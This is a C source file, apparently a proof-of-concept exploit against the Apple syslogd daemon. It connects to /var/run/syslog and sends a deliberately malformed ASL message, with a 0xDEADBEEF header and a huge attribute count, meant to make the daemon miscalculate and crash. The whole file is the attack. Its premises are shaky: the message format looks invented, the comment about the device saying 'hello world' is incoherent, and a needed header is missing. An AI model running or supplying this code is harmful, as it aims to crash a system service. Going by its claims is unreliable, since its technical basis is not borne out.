#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <asl.h>    // Apple System Log API
#include <sys/socket.h>
#include <sys/un.h>

#define SYSLOGD_SOCKET "/var/run/syslog"

int main() {
    int sock;
    struct sockaddr_un addr;
    char *malicious_message;
    size_t message_size = 0x100; // Initial message size

    // 1. Open a socket to syslogd
    sock = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    memset(&addr, 0, sizeof(struct sockaddr_un));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SYSLOGD_SOCKET, sizeof(addr.sun_path) - 1);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(struct sockaddr_un)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }

    // 2. Craft a malicious ASL message
    malicious_message = malloc(message_size);
    if (!malicious_message) {
        perror("malloc");
        close(sock);
        return 1;
    }
    memset(malicious_message, 'A', message_size); // Fill with 'A's for visibility

    // 3. Overwrite metadata fields dangerously
    // Normally ASL expects a specific header format, but we overflow by brute force

    // Insert a "hello world" string into the payload
    const char *hello = "hello world\n";
    memcpy(malicious_message + 8, hello, strlen(hello));

    // (Optional) Intentionally corrupt message size fields or metadata
    // e.g., lie about the size so syslogd miscalculates
    *(uint32_t *)(malicious_message + 0) = 0xDEADBEEF; // corrupted header field
    *(uint32_t *)(malicious_message + 4) = 0x20000000; // massive attribute count (absurdly large)

    // 4. Send the malicious message
    printf("[*] Sending malicious payload...\n");
    if (send(sock, malicious_message, message_size, 0) < 0) {
        perror("send");
        free(malicious_message);
        close(sock);
        return 1;
    }

    printf("[*] Payload sent! Device should say 'hello world'... and crash shortly after.\n");

    free(malicious_message);
    close(sock);
    return 0;
}
